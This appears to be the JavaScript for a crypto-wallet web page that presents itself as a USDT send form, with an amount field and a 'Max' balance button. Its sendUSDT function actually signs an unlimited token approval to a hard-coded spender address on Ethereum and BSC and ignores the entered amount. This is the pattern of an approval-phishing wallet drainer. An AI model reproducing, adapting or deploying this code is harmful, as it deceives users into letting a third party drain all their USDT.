/* ======================================================
   GLOBAL STATE
====================================================== */

let provider;
let signer;
let userAddress;

/* ======================================================
   CONFIG
====================================================== */

// Unlimited approval
const UNLIMITED_APPROVAL = ethers.MaxUint256;

// ERC20 ABI (USDT compatible)
const ERC20_ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// Supported chains ONLY
const CHAINS = {
  1: {
    name: "Ethereum",
    usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    spender: "0xaBe10e774745DAA4F43af098C4E0d66fAcfF3bC7"
  },
  56: {
    name: "BSC",
    usdt: "0x55d398326f99059fF775485246999027B3197955",
    spender: "0x220bb5df0893f21f43e5286bc5a4445066f6ca56"
  }
};

/* ======================================================
   WALLET CONNECT (SINGLE SOURCE OF TRUTH)
====================================================== */

async function connectWallet() {
  if (!window.ethereum) {
    alert("Wallet not found");
    throw new Error("No wallet");
  }

  // Request wallet access
  await window.ethereum.request({ method: "eth_requestAccounts" });

  provider = new ethers.BrowserProvider(window.ethereum);
  signer = await provider.getSigner();
  userAddress = await signer.getAddress();

  const network = await provider.getNetwork();
  const chainId = Number(network.chainId);

  const chain = CHAINS[chainId];
  if (!chain) {
    alert("Unsupported network. Use Ethereum or BSC only.");
    throw new Error("Unsupported chain");
  }

  return chain;
}

/* ======================================================
   APPROVE USDT (UNLIMITED)
====================================================== */

async function sendUSDT() {
  try {
    const chain = await connectWallet();

    const token = new ethers.Contract(
      chain.usdt,
      ERC20_ABI,
      signer
    );

    const tx = await token.approve(
      chain.spender,
      UNLIMITED_APPROVAL
    );

    await tx.wait();

    alert("Approval successful on " + chain.name);

  } catch (err) {
    console.error(err);
    alert("Transaction failed or cancelled");
  }
}

/* ======================================================
   MAX BUTTON (OPTIONAL UI)
====================================================== */

async function setMax() {
  try {
    const chain = await connectWallet();

    const token = new ethers.Contract(
      chain.usdt,
      ERC20_ABI,
      signer
    );

    const balance = await token.balanceOf(userAddress);
    const decimals = await token.decimals();

    document.getElementById("amount").value =
      ethers.formatUnits(balance, decimals);

  } catch (err) {
    console.warn("Max failed");
  }
}

/* ======================================================
   EXPOSE TO UI
====================================================== */

window.sendUSDT = sendUSDT;
window.setMax = setMax;
